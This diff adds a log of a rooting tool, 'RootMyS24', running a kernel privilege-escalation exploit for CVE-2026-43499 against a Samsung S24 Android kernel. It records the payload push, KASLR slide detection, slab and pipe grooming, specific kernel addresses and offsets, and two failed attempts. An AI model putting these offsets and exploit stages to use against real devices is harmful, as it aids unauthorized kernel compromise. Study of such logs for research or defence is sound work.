@@ -1,0 +1,77 @@
+◆ RootMyS24 启动中
+◆ 载荷: cve-2026-43499-byh7 (修正版, kmalloc_caches 0x176cbb8)
+[1/5] 检查 Shizuku...
+✔ Shizuku 就绪
+[2/5] 推送载荷到 /data/local/tmp ...
+✔ 推送完成 (cve-2026-43499-byh7=104128B, cve-2026-43499-root=27072B)
+◆ 诊断: pipe-max-size=? pipe-user-pages=cat: /proc/sys/fs/pipe-user-pages-soft: Permission denied
+cat: /proc/sys/fs/pipe-user-pages-hard: Permission denied
+n/a
+◆ 诊断: /proc/version=Linux version 6.1.99-android14-11-2370239-abS9210ZCU4BYH7 (build-user@build-host) (Android (10087095, +pgo, +bolt, +lto, -mlgo, based on r487747c) clang version 17.0.2 (https://android.googlesource.co
+[2.6/5] 清理残留 exploit 进程与临时文件 ...
+✔ 环境清理完成 (exit=137)
+[3/5] 触发 CVE-2026-43499 (LD_PRELOAD /system/bin/true) ...
+◆ 已自动熄屏（运行完成后将唤醒；可手动按电源键随时查看）
+[+] preload supervisor pid=15132 attempts=30 base_delay=20000 p0_timeout=45 timeout=120
+[+] exploit attempt=1/30 pid=15135 delay=50000 p0_offset=scan
+[+] startup context pid=15135 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=15135 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=15135 label=e1q-S9210ZCU4BYH7-app-physical-p0-oracle slide=pselect main=pselect
+[+] p0 profile pid=15135 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff8029605e7f bootid_data=ffffff802a27a2d0 init_task=ffffff802a15f040 root_tg=ffffff802a34bd80 sysctl_bootid=ffffff802a4c2628
+[+] slide tracefs pre-oracle base=ffffffc008000000 slide=00000000
+[+] slide-kaslr-ok source=tracefs pid=15135 base=ffffffc008000000 slide=0000000000000000
+[*] fresh physrw pipe page=ffffff8047278000
+[*] mm leaked=ffffff8a6a009400 base=ffffff8a6a008000 object_index=5
+[*] S928 bank bucket=5 lock=0x22a0 task=0x1000 mode=0
+[*] mm target-neighbor slab queued for late drain
+[*] mm late cpu-partial drain triggers=32
+[*] sk_buff reclaim sends=16/16 mode=0
+[*] kernel page prepare mode=0 attempt=1/2 elapsed_ms=6553 base=ffffff8a6a008000
+[*] app fops slide route parent=ffffff8a6a009180 target=ffffff802a2beea8 lock=ffffff8a6a009420 delay=70000
+[+] slide child context route=pselect pid=24130 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[*] app fops slide attempt=1/1 triggered=0 verified=0 step=0 errno=0
+[+] pipe-physrw-summary pid=15135 done=0 root=0 kaslr=1 base=ffffffc008000000 slide=0000000000000000
+[+] pipe physrw pid=15135 done=0 root=0 kaslr=1 read_ok=0 write_ok=0 rw64=0/0 uid=4294967295->4294967295
+[+] supervisor retained p0_offset=0x0 gate=0x0 probe=0x0
+[-] exploit attempt=1/30 failed status=1
+[*] safe retry quiet delay seconds=5
+[+] exploit attempt=2/30 pid=24149 delay=50000 p0_offset=0x0
+[+] startup context pid=24149 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[+] startup limits pid=24149 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[+] build config pid=24149 label=e1q-S9210ZCU4BYH7-app-physical-p0-oracle slide=pselect main=pselect
+[+] p0 profile pid=24149 phys_offset=0000000080000000 kernel_phys_load=00000000a8000000 delta=0000000028000000 slide_logger=ffffff8029605e7f bootid_data=ffffff802a27a2d0 init_task=ffffff802a15f040 root_tg=ffffff802a34bd80 sysctl_bootid=ffffff802a4c2628
+[*] slide forced p0 offset=00000000
+[+] slide-kaslr-ok source=forced pid=24149 base=ffffffc008000000 slide=0000000000000000
+[*] fresh physrw pipe page=ffffff889bb38000
+[*] mm leaked=ffffff8817067000 base=ffffff8817060000 object_index=28
+[-] S928 lock bucket rejected=28 max=27 mode=0
+[*] kernel page prepare mode=0 attempt=1/2 elapsed_ms=8772 base=0000000000000000
+[-] prepare_kernel_page retry 1/2
+[*] mm leaked=ffffff88efd11400 base=ffffff88efd10000 object_index=5
+[*] S928 bank bucket=5 lock=0x22a0 task=0x1000 mode=0
+[*] mm target-neighbor slab queued for late drain
+[*] mm late cpu-partial drain triggers=32
+[*] sk_buff reclaim sends=16/16 mode=0
+[*] kernel page prepare mode=0 attempt=2/2 elapsed_ms=6373 base=ffffff88efd10000
+[*] app fops slide route parent=ffffff88efd11180 target=ffffff802a2beea8 lock=ffffff88efd11420 delay=70000
+[+] slide child context route=pselect pid=9996 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[*] stage=verifying-kernel-access
+[*] cfi write ret=35 errno=0
+[*] cfi read ret=35 errno=0
+[*] cfi restoring misc_fops target=ffffff802a2beea8 value=ffffffc00934bc98
+[*] cfi starting pipe physrw
+[*] pipe caches normal1k=ffffff8001cf6700 normal2k=ffffff8001cf6800 cgroup1k=ffffff8001cf7000 cgroup2k=ffffff8001cf7100 selected=ffffff8001cf7100
+[*] pipe page idx=0 page=ffffff889bb38000 head=fffffffe226ece00 cache08=fffffffe208aac08 cache10=fffffffe2919de08 cache18=0000000000000000 cache20=0000000000000000 type=ffffff7f match=0
+[*] pipe page idx=1 page=ffffff889bb39000 head=fffffffe226ece40 cache08=0000000000000000 cache10=ffffffff00000301 cache18=0000000000000000 cache20=0000000000000000 type=ffffffff match=0
+[*] pipe page idx=2 page=ffffff889bb3a000 head=fffffffe226ece80 cache08=0000000000000000 cache10=dead000000000122 cache18=0000000000000000 cache20=0000000000000000 type=ffffffff match=0
+[*] pipe page idx=3 page=ffffff889bb3b000 head=fffffffe226ecec0 cache08=0000000000000000 cache10=dead000000000122 cache18=0000000000000000 cache20=0000000000000000 type=ffffffff match=0
+[*] pipe page idx=4 page=ffffff889bb3c000 head=fffffffe226ecf00 cache08=0000000000000000 cache10=dead000000000122 cache18=0000000000000000 cache20=0000000000000000 type=ffffffff match=0
+[*] pipe page idx=5 page=ffffff889bb3d000 head=fffffffe226ecf40 cache08=0000000000000000 cache10=dead000000000122 cache18=0000000000000000 cache20=0000000000000000 type=ffffffff match=0
+[*] pipe page idx=6 page=ffffff889bb3e000 head=fffffffe226ecf80 cache08=0000000000000000 cache10=dead000000000122 cache18=0000000000000000 cache20=0000000000000000 type=ffffffff match=0
+[*] pipe page idx=7 page=ffffff889bb3f000 head=fffffffe226ecfc0 cache08=0000000000000000 cache10=dead000000000122 cache18=0000000000000000 cache20=0000000000000000 type=ffffffff match=0
+[*] phys step cache gate failed slab=0000000000000000 want=ffffff8001cf7100
+[*] app fops slide attempt=1/1 triggered=1 verified=0 step=8 errno=0
+[+] pipe-physrw-summary pid=24149 done=0 root=0 kaslr=1 base=ffffffc008000000 slide=0000000000000000
+[+] pipe physrw pid=24149 done=0 root=0 kaslr=1 read_ok=0 write_ok=0 rw64=0/0 uid=4294967295->4294967295
+[-] exploit attempt=2/30 failed status=1
+[*] safe retry quiet delay seconds=5
